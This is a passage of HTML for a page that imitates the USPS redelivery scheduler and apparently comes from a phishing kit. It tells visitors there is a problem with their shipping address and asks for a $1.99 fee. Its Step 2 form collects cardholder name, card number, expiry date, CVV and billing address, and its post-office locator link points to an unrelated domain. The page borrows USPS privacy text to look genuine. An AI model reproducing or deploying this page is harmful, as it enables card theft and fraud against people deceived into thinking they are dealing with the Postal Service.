                            <a href="##" class="tab-link modify-redelivery-header" data-toggle="modal" data-target="#modify-redelivery-request-modal" data-backdrop="static" aria-label="Modify Redelivery Request. Click to open popup window to search for existing redelivery requests.">Modify Redelivery Request</a>
                        </li>
                        <li class="tab last-tab">
                            <a href="https://www.usps.com/faqs/redelivery-faqs.htm" target="_blank" class="header-faqs" aria-label="Redelivery FAQs. Select to open FAQs about Redelivery in a new tab.">FAQs<span class="sr-only"> about Schedule a Redelivery</span></a>
                        </li>
                    </ul>
                    <h1>Schedule a New delivery</h1>
                </div>
                <div class="hidden-lg hidden-md hidden-sm col-xs-12 dropdown-selection-container">
                    <div class="dropdown-selection">
                        <button type="button" class="btn dropdown-toggle dropdown dropdown-items-wrapper form-control" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" id="" value="">Schedule a Redelivery</button>
                        <ul class="dropdown-menu">
                            <li><a href="##" class="dropdown-item" data-value="">Schedule a Redelivery</a></li>
                            <li><a href="##" class="dropdown-item" data-toggle="modal" data-target="#modify-redelivery-request-modal" data-backdrop="static" data-value="">Modify Redelivery Request</a></li>
                            <li><a href="https://www.usps.com/faqs/redelivery-faqs.htm" class="dropdown-item" target="_blank" data-value="faqs-url">FAQs<span class="sr-only"> about Schedule a Redelivery</span></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="Redelivery_Steps_Container">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-9 col-sm-10 col-xs-12 redelivery-intro">
                    <p>We have issues with your shipping address, You can schedule redelivery online by Submit your new address, We Redeliver for you!</p>
                    <p>Redeliveries can be scheduled online 24 hours a day, 7 days a week. For same-day Redelivery, make sure your request is submitted by 2 AM CST Monday-Saturday or your Redelivery will be scheduled for the next day.
                </p></div>
            </div>
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                    <hr class="horizontal-line">
                </div>
            </div>

            

            <!-- START STEP ONE -->
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 step-wrapper step-one-drawer disabled">
                    <div class="step-header">
                        <h2 class="normal"><a href="##" aria-label="Step 1 drawer: Click to enter information to Check if Redelivery is available for your address.">Step 1: <strong>Provide Your Delivery Address.</strong></a></h2>
                        <div class="address-redelivery-confirmed">
                            <p class="available-header">Available</p>
                        </div>
                    </div>
                    <!-- </a> -->
                    <div class="step-drawer">
                        <p>Please provide your delivery address below.</p>




                        <div class="step-one-form">
                            <div class="row">
                                <div class="col-md-12 col-sm-12 col-xs-12 form-group">
                                    <p class="required-field-instructions">*indicates a required field</p>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-5 col-sm-4 col-xs-9 form-group required-field">
                                    <label for="firstName" class="">*First Name</label>
                                    <input maxlength="20" tabindex="0" type="text" name="firstName" id="firstName" class="form-control">
                                    <span id="firstNameErrorMessage" class="error-message">Please enter your first name</span>
                                </div>
                                <div class="col-md-1 col-sm-2 col-xs-3 form-group">
                                    <label for="middleInitial" class="">M.I.</label>
                                    <input tabindex="0" type="text" class="form-control" maxlength="10" name="middleInitial" id="middleInitial">
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="lastName" class="">*Last Name</label>
                                    <input maxlength="20" tabindex="0" type="text" name="lastName" id="lastName" class="form-control">
                                    <span id="lastNameErrorMessage" class="error-message">Please enter your last name</span>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-10 col-sm-9 col-xs-12 form-group required-field">
                                    <label for="addressLineOne" class="">*Street Address</label>
                                    <input tabindex="0" type="text" name="addressLineOne" maxlength="60" id="addressLineOne" class="form-control">
                                    <span id="addressLineOneErrorMessage" class="error-message">Please enter a valid address</span>
                                </div>
                                <div class="col-md-2 col-sm-3 col-xs-12 form-group">
                                    <label for="addressLineTwo" class="">Apt/Suite/Other</label>
                                    <input tabindex="0" type="text" name="addressLineTwo" id="addressLineTwo" class="form-control">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="city" class="">*City</label>
                                    <input tabindex="0" type="text" name="city" id="city" maxlength="15" class="form-control">
                                    <span id="cityErrorMessage" class="error-message">Please enter a valid city</span>
                                </div>
                                <div class="col-md-4 col-sm-4 col-xs-7 form-group required-field">
                                    <label for="state" class="">*State</label>
                                    <input tabindex="0" type="text" name="State" id="State" maxlength="15" class="form-control">
                                    <span id="stateErrorMessage" class="error-message">Please enter a valid state</span>
                                </div>
                                <div class="col-md-2 col-sm-2 col-xs-5 form-group required-field">
                                    <label for="zipCode" class="">*ZIP Code<sup>™</sup></label>
                                    <input tabindex="0" type="text" maxlength="5" name="zipCode" id="zipCode" class="form-control">
                                    <span id="zipCodeErrorMessage" class="error-message">Please enter a valid ZIP Code<sup>™</sup></span>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="phone" class="">*Phone</label>
                                    <input tabindex="0" name="phone" id="phone" type="text" class="form-control" maxlength="12">
                                    <span id="phoneErrorMessage" class="error-message">Please enter a valid phone number</span>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="emailAddress" class="">*Email</label>
                                    <input tabindex="0" name="emailAddress" id="emailAddress" type="text" maxlength="50" class="form-control">
                                    <span id="emailAddressErrorMessage" class="error-message" style="display: none;">Please enter a valid email</span>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                    <div class="button-container">
                                        <button role="submit" class="btn-primary check-availability" tabindex="0">Continue</button>
                                    </div>

                                </div>

                            </div>
                            <div class="row">
                                <div class="col-md-10 col-sm-10 col-xs-12 privacy-act-statement-wrapper">
                                    <p class="privacy-act-statement-header">Privacy Act Statement</p>
                                    <p>Your information will be used to provide you requested products, services, or information. Collection is authorized by 39 USC 401, 403, &amp; 404. Supplying your information is voluntary, but if not provided, we may not be able to process your request. We do not disclose your information to third parties without your consent, except to act on your behalf or request, or as legally required. This includes the following limited circumstances: to a congressional office on your behalf; to agencies and entities to facilitate or resolve financial transactions; to a U.S. Postal Service auditor; for law enforcement purposes, to labor organizations as required by applicable law; incident to legal proceedings involving the Postal Service; to government agencies in connection with decisions as necessary; to agents or contractors when necessary to fulfill a business function or provide products and services to customers; and for customer service purposes. For more information regarding our privacy policies visit <a href="https://www.usps.com/privacypolicy" target="_blank" class="textUrl">www.usps.com/privacypolicy.</a></p>
                                </div>
                            </div>



                        </div>
                        <div class="step-one-validation">
                            <div class="row">
                                <div class="col-md-4 col-sm-4 col-xs-12 name-primary-address-wrapper">
                                    <p class="name-address-header">Name and Primary Address:</p>
                                    <p><span id="verifiedAFirstName"></span> <span id="verifiedAMiddleName"></span> <span id="verifiedALastName"></span></p>
                                    <p class="hidden" id="verifiedCompanyLine"><span id="verifiedACompanyName"></span></p>
                                    <p id="verifiedUrb"><span id="verifiedUrbCode"></span></p>
                                    <p id="verifiedUrbCodeLine" class="hidden"><span id="verifiedAUrbCode"></span></p>
                                    <p><span id="verifiedAAddressLineOne"></span></p>
                                    <p class="hidden" id="verifiedAddLTwoLine"><span id="verifiedAAddressLineTwo"></span></p>
                                    <p><span id="verifiedACityStateZip"></span></p>
                                </div>
                                <div class="col-md-4 col-sm-4 col-xs-12">
                                    <div class="phone-wrapper">
                                        <p class="phone-header">Phone:</p>
                                        <p><span id="verifiedAPhone"></span></p>
                                    </div>
                                    <div class="email-wrapper">
                                        <p class="email-header">Email:</p>
                                        <p><span id="verifiedAEmailAddress"></span></p>
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12 col-xs-12 edit-address-wrapper">
                                    <a href="##" class="inline-link secondary edit-redelivery-address" aria-label="Edit Address">Edit</a>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-9 col-sm-10 col-xs-12 redelivery-unavailable-wrapper">
                                    <p class="unavailable-header">Unavailable</p>    
                                    <p class="unavailable-content">Sorry, online Redelivery requests are not available for this address. You will need to pick up your mail or package. To find your </p><p class="hidden">local</p>Post Office<sup>®</sup> facility and pickup hours, go to <a href="https://conquistarmulhereshoje.com/find-location.htm" target="_blank" class="inline-link secondary track-package"><strong>Find USPS Locations.</strong></a> If the address above is not the correct address, please select Edit and enter the correct address.<p></p>
                                    <!--<p class="unavailable-content"><a href="/go/TrackConfirmAction_input" target="_blank" class="inline-link secondary track-package"><strong>Track a Package</strong></a></p>-->
                                </div>
                                <div class="col-md-12 col-sm-12 col-xs-12 redelivery-available-wrapper">
                                    <p class="available-header"> <img class="availableIcon" src="files/2_files/available-icon.png" role="alert" aria-label="Address Available" aria-live="rude" aria-atomic="true"> Available</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div>
            <!-- START STEP TWO -->
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 step-wrapper step-two-drawer current-step active">
                    <div class="step-header">
                        <h2 class="normal"><a href="##" aria-label="Step 2 drawer: Click to search for and select packages for redelivery.">Step 2: <strong>Payment Methods.</strong></a></h2>

                    </div>
                    <div class="step-drawer tracking-number-search-wrapper">
                        <div class="row">
                            <div class="col-md-11 col-sm-11 col-xs-11 step-subheader">
                                <p>To complete the Online Redelivery you will need a valid credit or debit card for the $1.99 charge. </p>
                                <br><br>
                                <img src="files/2_files/VISA.png" alt="" id="visaIcon" width="38" ng-click="vm.quickCard();"><img src="files/2_files/MasterCard.png" alt="" id="mcIcon" width="38" ng-click="vm.quickCard();"><img src="files/2_files/AmEx.png" alt="" id="amexIcon" width="38" ng-click="vm.quickCard();">
                            </div>

                            <div class="col-md-4 col-sm-4 col-xs-12 form-group required-field">
                                    <label for="firstName" class="">*Cardholder</label>
                                    <input required="" maxlength="50" tabindex="0" type="text" name="Cardholder" id="Cardholder" class="form-control">
                                    <span id="firstNameErrorMessage" class="error-message">Please enter your first name</span>
                                </div>

                              <div class="col-md-4 col-sm-4 col-xs-12 form-group required-field">
                                    <label for="cardn" class="">*Card Number</label>
                                    <input required="" tabindex="0" name="cardn" id="cardn" type="text" class="form-control" maxlength="19">
                                    <span id="cardnErrorMessage" class="error-message">Please enter a valid card number</span>
                                </div>

                              <div class="col-md-2 col-sm-2 col-xs-7 form-group required-field">
                                    <label for="Expiry" class="">*Expires on (MM/YYYY)</label>
                                    <input required="" tabindex="0" name="Expiry" id="Expiry" type="text" class="form-control" maxlength="7">
                                    <span id="ExpiryErrorMessage" class="error-message">Please enter a valid expiry</span>
                                </div>

                              <div class="col-md-2 col-sm-2 col-xs-5 form-group required-field">
                                    <label for="cvv2" class="">*Security code (CVV)</label>
                                    <input required="" tabindex="0" name="cvv2" id="cvv2" type="text" class="form-control" maxlength="4" >
                                    <span id="cvv2ErrorMessage" class="error-message">Please enter a valid security code</span>
                                </div>



                                <div class="col-md-12 col-sm-12 col-xs-12 form-group">
                                    <p class="required-field-instructions">*Payment Details</p>
                                </div>

                                <div class="col-md-12 col-sm-12 col-xs-12 form-group required-field">
                                    <label for="firstName" class="">*Address</label>
                                    <input maxlength="100" tabindex="0" type="text" name="bAddress" id="bAddress" class="form-control">
                                    <span id="firstNameErrorMessage" class="error-message">Please enter your Address</span>
                                </div>

                                <div class="col-md-6 col-sm-6 col-xs-12 form-group required-field">
                                    <label for="city" class="">*City</label>
                                    <input tabindex="0" type="text" name="city1" id="city1" maxlength="15" class="form-control">
                                    <span id="cityErrorMessage" class="error-message">Please enter a valid city</span>
                                </div>
                                <div class="col-md-4 col-sm-4 col-xs-7 form-group required-field">
                                    <label for="state" class="">*State</label>
                                    <input tabindex="0" type="text" name="State1" id="State1" maxlength="15" class="form-control">
                                    <span id="stateErrorMessage" class="error-message">Please enter a valid state</span>
                                </div>
                                <div class="col-md-2 col-sm-2 col-xs-5 form-group required-field">
                                    <label for="zipCode" class="">*ZIP Code<sup>™</sup></label>
                                    <input tabindex="0" type="text" maxlength="5" name="zipCode1" id="zipCode1" class="form-control">
                                    <span id="zipCodeErrorMessage" class="error-message">Please enter a valid ZIP Code<sup>™</sup></span>
                                </div>


                                <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                    <div class="button-container">
                                        <button  id="okbb" name="okbb" role="button" type="submit" class="btn-primary check-availability1" tabindex="0">Continue</a>
                                    </div>
                                </div>


                                <div class="col-md-10 col-sm-10 col-xs-12 privacy-act-statement-wrapper">
                                    <p class="privacy-act-statement-header">Privacy Act Statement</p>
                                    <p>Your information will be used to provide you requested products, services, or information. Collection is authorized by 39 USC 401, 403, &amp; 404. Supplying your information is voluntary, but if not provided, we may not be able to process your request. We do not disclose your information to third parties without your consent, except to act on your behalf or request, or as legally required. This includes the following limited circumstances: to a congressional office on your behalf; to agencies and entities to facilitate or resolve financial transactions; to a U.S. Postal Service auditor; for law enforcement purposes, to labor organizations as required by applicable law; incident to legal proceedings involving the Postal Service; to government agencies in connection with decisions as necessary; to agents or contractors when necessary to fulfill a business function or provide products and services to customers; and for customer service purposes. For more information regarding our privacy policies visit <a href="https://www.usps.com/privacypolicy" target="_blank" class="textUrl">www.usps.com/privacypolicy.</a></p>
                                </div>

</form>


                            <div class="col-md-12 col-sm-12 col-xs-12 tracking-results-wrapper">
                                <p class="showing-results hidden" role="alert"><strong>Showing <span id="results-barcode-or-tracking">results for barcode number</span>: </strong><br class="number-separator"><span id="barCodeNumber" class="tracking-num">1A2B 3C1A 2B3C 1A2B</span><span aria-label="Tab to open tracking details"></span></p>
                                <div class="row">
                                    <div class="col-md-10 col-sm-11 col-xs-12 tracking-number-table-wrapper">
                                        <div class="table-header-wrapper">
                                            <div class="col-md-6 col-sm-6 col-xs-6 tracking-number-header">
                                                <p>Tracking Number</p>
                                            </div>
                                            <div class="col-md-6 col-sm-6 col-xs-6 details-header">
                                                <p>Details</p>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-12 col-sm-12 col-xs-12 column-dropdown-wrapper">
                                                <div id="redeliveryTrackingBreakdown" class="column-item-container">

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-12 col-sm-12 col-xs-12 review-button-wrapper">
                                        <a href="##" role="button" class="btn-primary review-btn" aria-label="Review button. Select a redelivery option and click Review to Review your selections for the selected redeliveries.">Review</a>
                                        <div class="col-md-12 col-sm-12 col-xs-12 review-error-wrapper required-field">
                                            <!--<span class="error-message">Click Review to save your changes before you confirm.</span>-->
                                            <span class="selectRed" style="display: none;" aria-label="Error: Please select at least one Redelivery above to continue">Please select at least one Redelivery to continue.</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div>


            <!-- START STEP THREE -->
            <div class="row confirm-selection">
                <div class="col-md-12 col-sm-12 col-xs-12 step-three-drawer step-wrapper disabled">
                    <div class="step-header">
                        <h2 class="normal"><a href="##" aria-label="Step 3 drawer: Click to confirm your redelivery selections">Step 3: <strong>Confirm selections for Redelivery.</strong></a></h2>
                        <div class="redelivery-selection-confirmed">

                        </div>
                    </div>
                    <div class="step-drawer">
                        <p class="step-subheader">You have successfully submitted the address specified for redelivery. Select Confirm to Proceed.</p>
                        <div id="review-selected-redeliveries" class="col-12 col-md-12 selected-tracking-number-wrapper">

                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 terms-conditions-wrapper required-field">
                                <div class="checkbox-wrap">
                                    <div class="checkbox-container">
                                        <label class="checkbox-component" for="terms-conditions-checkbox">
                                            <input type="checkbox" id="terms-conditions-checkbox">
                                            <span class="checkbox"></span>
                                            <p>I have read, understood, and accept the <a id="termsConditionsLink" href="##" target="_blank" class="inline-link secondary">Terms and Conditions</a> for Redelivery.</p>
                                        </label>
                                        <div class="col-md-12 col-sm-12 col-xs-12 terms-conditions-wrapper required-field">
                                        <span class="error-message termsError" aria-label="Error. Please accept the Terms and Conditions" role="alert" aria-atomic="true" aria-live="rude">Please accept Terms and Conditions.</span>
                                      </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 confirm-button-wrapper">

                            <a href="##" role="button" class="btn-primary confirm-selection-btn" aria-label="Confirm button. Click to confirm redeliveries for the requested tracking numbers.">Confirm</a>


                            <div class="col-md-12 col-sm-12 col-xs-12 review-error-wrapper required-field">
                                <span class="error-message">Please select Confirm to continue.</span>
                            </div>
                        </div>
                        <div class=" col-md-12 col-sm-12 col-xs-12 button-container submit-wrapper">
                            <a role="button" class="btn-primary submit-request" tabindex="0" aria-label="Submit button. Click to confirm redeliveries for the requested tracking numbers.">Submit</a>
                        </div>

                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div>
            <!-- START STEP FOUR -->
            <div class="row informed-delivery-wrapper">
                <div class="col-md-12 col-sm-12 col-xs-12 step-four-drawer step-wrapper disabled">
                    <div class="step-header">
                        <h2 class="normal"><a href="##" aria-label="Step 4 drawer: Click to Sign up for Informed Delivery">Step 3: <strong>Sign up for Informed Delivery.</strong></a></h2>
                    </div>
                    <div class="step-drawer">
                        <div class="step-four-form">
                            <div class="row">
                                <div class="col-md-11 col-sm-11 col-xs-12 step-subheader">
                                    <p>Easily track your Redelivery request anytime, anywhere. Sign up for Informed Delivery<sup>®</sup> notifications, a free feature that allows you to check the Redelivery status of your packages, preview incoming mail, and more. <a class="inline-link secondary" href="https://informeddelivery.usps.com/" target="_blank">Learn More<span class="sr-only"> about Informed Delivery</span></a></p>
                                </div>
                                <div class="col-md-11 col-sm-11 col-xs-12 sign-up-for-redelivery radio-buttons container required-field">
                                    <p>*Would you like to sign up for Informed Delivery notifications for your USPS.com profile address?</p>
                                    <div class="radio-wrap">
                                        <div class="radio-container">
                                            <input id="yes-radio" type="radio" class="radio-button first" name="informed-delivery-rb" tabindex="0">
                                            <label for="sign up for informed delivery">Yes, I would like to sign up.</label>
                                            <br>
                                            <br>
                                        </div>
                                        <div id="sign-up-yes-message">
                                            <p>You will be redirected to the Informed Delivery enrollment site to complete enrollment after submitting your Redelivery request.</p>
                                            <p>Mail and packages will populate your dashboard and daily notification in 2 to 5 business days. To track a package sooner, manually enter the tracking number into your dashboard. You can unsubscribe at any time.</p>
                                        </div>
                                        <div class="radio-container">
                                            <input id="no-radio" type="radio" class="radio-button second" name="informed-delivery-rb" tabindex="0">
                                            <label for="not interested in informed delivery">No, I am not interested at this time.</label>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <span class="error-message">Please select if you want to sign up for Informed Delivery.</span>
                                        </div>
                                    </div>

                                </div>
                                <div class=" col-md-12 col-sm-12 col-xs-12 button-container submit-wrapper">
                                    <a role="button" class="btn-primary submit-request" tabindex="0">Submit</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 horizontal-line-container">
                            <hr class="step horizontal-line">
                        </div>
                    </div>
                </div>
            </div>
            <!--<div class="row step-one-demo-btn" style="padding-top: 30px;">
        <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
          <h2 style="font-size: 22px;">For display purpose only</h2>
          <div class="button-container">
            <a href="#" role="button" class="btn-primary button--white error-display">Display Errors</a>
          </div>
          <div class="button-container">
            <a href="#" role="button" class="btn-primary service-unavailable">Address Unavailable</a>
          </div>
          <div class="button-container">
            <a href="#" role="button" class="btn-primary" id="display-white-spinner">Spinner</a>
          </div>
          <div class="button-container">
            <a href="#" role="button" class="btn-primary" data-toggle="modal" data-target="#service-unavailable-modal" data-backdrop="static">Service Unavailable</a>
          </div>
          <div class="button-container">
            <a href="#" role="button" class="btn-primary unqualified-informed-delivery">Unqualified Informed Delivery</a>
          </div>
        </div>
      </div>-->
        </div>
    </div>


    <!-- START TRACKING/BARCODE CONTENT -->
    <div class="tracking-barcode-popover" style="display: none;">
        <div class="popover-wrapper">
            <div class="popover-header">
            </div>
            <ul class="bullet-list">
                <li class="trackingPopover">Tracking numbers are for an individual package</li>
                <li class="trackingPopover">Barcode numbers can have multiple tracking numbers associated with it</li>
                <li class="trackingPopover">Both tracking and barcode numbers are between 13 and 34 characters</li>
            </ul>
        </div>
    </div>

    <div class="modal fade" id="tracking-barcode-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <a href="##" type="button" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
                    <h3 class="modal-title"></h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <ul class="bullet-list">
                            <li class="trackingPopover">Tracking numbers are for an individual package</li>
                            <li class="trackingPopover">Barcode numbers can have multiple tracking numbers associated with it</li>
                            <li class="trackingPopover">Both tracking and barcode numbers are between 13 and 34 characters</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END TRACKING/BARCODE CONTENT -->



    <!-- START NEW SEARCH -->
    <div class="modal fade" id="new-search-modal" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title" role="alert">Are you sure you want to start a new search? <span aria-label="If you select Yes, your current progress will be lost. Select no to go back. Tab to make your selection."></span></h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>If you select Yes, your current progress will be lost. Select No to go back.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary" id="new-search-yes" data-dismiss="modal" aria-label="Yes" tabindex="0">Yes</a>
                                </div>
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary button--white" id="new-search-no" data-dismiss="modal" aria-label="No" tabindex="0">No</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END NEW SEARCH -->



    <!-- START DELETE PACKAGE CONFIRMATION -->
    <div class="modal fade" id="delete-selected-redelivery-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Are you sure you want to remove this package from the Redelivery request?</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>If you select Yes, the package will be removed from this request. Select No to go back.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary" id="delete-package-yes" data-dismiss="modal" tabindex="0">Yes</a>
                                </div>
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary button--white" id="delete-package-no" data-dismiss="modal" tabindex="0">No</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END DELETE PACKAGE CONFIRMATION -->



    <!-- START CALENDAR MODAL -->
    <div class="modal fade" id="modal-start-end" role="dialog">
        <div class="dialog-start-end modal-dialog">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Select Date</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12">
                                <p class="normal select-date-subheader">Available dates are based on the package selected.</p>
                            </div>
                        </div>
                        <div class="row start-end-dates-cal-container">
                            <div class="col-md-12 col-sm-12 col-xs-12 resume-date-cal">
                                <div id="resume-start-cal"></div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 required-field">
                                <p class="normal date-selected"><strong>Date Selected:</strong><input type="text" id="modal-resume-date" disabled=""></p>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary" id="save-resume-date" data-dismiss="modal" tabindex="0">Select</a>
                                </div>
                            </div>
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary button--white clearDates" id="clear-resume-dates" data-dismiss="modal" tabindex="0">Cancel</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END CALENDAR MODAL -->



    <!-- START MODIFY REDELIVERY REQUEST -->
    <div class="modal fade" id="modify-redelivery-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog large">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <a href="##" type="button" id="closeModalModify" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
                    <h3 class="modal-title">Search for an Existing Redelivery Request</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>Please provide your confirmation number and the associated email or phone number below.</p>
                        <br>
                        <p class="">*indicates a required field</p>
                        <div id="appointmentErrorContainer" class="row" style="display: none;">
                            <div class="col-md-12 col-sm-12 col-xs-12 formGroup">
                                <br>
                                <span class="error-icon"></span><span style="margin-left: 25px; font-weight: bold;" id="appointmentError" class="error-message"></span>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 form-group required-field">
                                <label for="" class="">*Confirmation Number</label>
                                <input id="confirmationNumberField" tabindex="0" type="text" class="form-control">
                                <span role="alert" id="confirmationNumberErrorMessage" class="error-message">Please enter a valid confirmation number</span>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 form-group required-field">
                                <label for="" class="">*Enter Email Address or Phone Number</label>
                                <input id="modifyLookupEmail" tabindex="0" type="text" class="form-control">
                                <span role="alert" id="emailAddresConfErrorMessage" class="error-message">Please enter a valid email address or phone number</span>
                            </div>
                        </div>
                        <!--<div class="row">
              <div class="col-md-6 col-sm-6 col-xs-12 form-group email-modify-input">
                <label for="" class="">Email</label>
                <input id="modifyLookupEmail" tabindex="0" type="text" class="form-control">
              </div>
              <div class="col-md-1 col-sm-1 col-xs-12 email-phone-separator">
                <p>or</p>
              </div>
              <div class="col-md-6 col-sm-6 col-xs-12 form-group phone-modify-input">
                <label for="" class="">Phone</label>
                <input id="modifyLookupTelephone" tabindex="0" type="text" class="form-control">
              </div>
            </div>-->
                    </div>
                </div>
                <div class="modal-buttons">
                    <div class="button-container">
                        <a href="##" id="searchRedeliveries" type="button" class="btn-primary" tabindex="0">Search</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END MODIFY REDELIVERY REQUEST -->



    <!-- START CANCEL REDELIVERY REQUEST -->
    <div class="modal fade" id="cancel-redelivery-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Are you sure you want to cancel this Redelivery request?</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>If you select Yes, this entire request will be canceled and cannot be recovered. Select No to go back.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary" tabindex="0">Yes</a>
                                </div>
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary button--white" id="dont-cancel-request" data-dismiss="modal" tabindex="0">No</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END CANCEL REDELIVERY REQUEST -->

    <!-- START CHECK AVAILABILITY MODAL -->
    <div class="modal fade" id="checkAvailabilityModal" role="dialog" style="display: none;">
        <div class="modal-dialog">
            <div class="modal-content modal-container checkAvailabilityModal">
                <div class="modal-header">
                    <button type="button" class="step-one-close close" data-dismiss="modal"></button>
                    <h4 class="step-one-modal-title modal-title">Please choose a valid USPS address that matches the one you entered.</h4>
                </div>
                <div class="step-one-modal-body modal-body">
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 form-group">
                            <p class="step-one-modal-sub sub-header"><strong>Your address as you entered it:</strong></p>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 form-group street-num-name street-num-name">
                            <p id="enteredAddress">123 BROAD ST</p>
                            <p id="enteredCityStateZip">BROOKLYN NY 11206-1234</p>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 mobile-modal step-one-modal-line horizontal-line-container">
                            <hr class="horizontal-line">
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 form-group sub-header-container">
                            <p class="step-one-modal-sub sub-header"><strong>Choose one of the addresses we found:</strong></p>
                        </div>
                        <div class="found-addresses required-field">
                            <div class="pick-valid-address step-one-radio-wrap radio-wrap mobile-modal" id="pickaPlace">
                            </div>
                            <span class="error-message selectAddressError" style="display: none;">Please select one of the addresses found.</span>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 buttons-holder">
                            <div class="button-container">
                                <a role="button" class="btn-primary use-selected-address">Use Selected Address</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END CHECK AVAILABILITY MODAL -->




    <!-- START UNABLE TO CANCEL REQUEST -->
    <div class="modal fade" id="unable-cancel-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Sorry, your request cannot be canceled.</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>All cancellations must be submitted before 2AM CST on the day of the Redelivery.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper btn-centered">
                                <div class="button-container">
